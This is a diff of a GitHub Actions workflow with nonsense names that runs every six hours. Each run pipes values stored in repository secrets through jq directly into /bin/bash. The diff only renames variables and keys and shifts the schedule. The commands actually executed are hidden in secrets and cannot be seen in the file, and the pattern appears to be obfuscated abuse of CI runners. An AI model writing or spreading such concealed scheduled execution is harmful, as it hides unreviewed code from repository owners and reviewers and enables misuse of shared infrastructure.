@@ -1,11 +1,9 @@
 name: couldskillful
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 0/6 * * *'
-
-jobs:  # 13950
+    - cron: '3 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +11,13 @@ jobs:  # 13950
       - uses: actions/checkout@v4
       - name: couldskillful
         env:
-          qb32377: ${{ secrets.qb32377 }}
+          xn2: ${{ secrets.xn2 }}
         run: |
-          echo $qb32377 | jq -r .uzl1 | /bin/bash
-          echo $ui85757 | jq -r .pddz2 | /bin/bash
-          echo $smd005 | jq -r .z4641 | /bin/bash
-          echo $hyfe0 | jq -r .wmg026 | /bin/bash
-          echo $b9048 | jq -r .adjt55 | /bin/bash
-          echo $qsnzn882 | jq -r .syjrc31992 | /bin/bash
-          echo $fuzy552 | jq -r .zn6399 | /bin/bash
+          echo $xn2 | jq -r .d14 | /bin/bash
+          echo $zh87715 | jq -r .utqcg31165 | /bin/bash
+          echo $kmf2972 | jq -r .lvtqa8 | /bin/bash
+          echo $i4 | jq -r .i04 | /bin/bash
+          echo $cspqo9 | jq -r .lygbs00 | /bin/bash
+          echo $lb47862 | jq -r .okiu041 | /bin/bash
+          echo $brs9776 | jq -r .wmpbt81 | /bin/bash
 
